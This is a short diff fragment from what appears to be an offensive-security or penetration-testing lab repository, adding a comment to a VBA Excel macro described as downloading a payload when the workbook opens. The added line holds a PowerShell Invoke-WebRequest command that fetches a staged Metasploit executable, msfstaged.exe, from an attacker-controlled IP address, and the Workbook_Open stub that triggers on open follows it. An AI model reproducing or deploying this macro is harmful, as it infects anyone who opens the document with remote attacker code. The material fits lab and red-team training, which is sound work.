@@ -1,4 +1,5 @@
 \\Simple Excel Macro to download payload on open. 
+\\Can also be use with Invoke-WebRequest - str = "powershell Invoke-WebRequest -Uri http://192.168.49.56/msfstaged.exe -OutFile msfstaged.exe"
 
 
 Sub Workbook_Open()
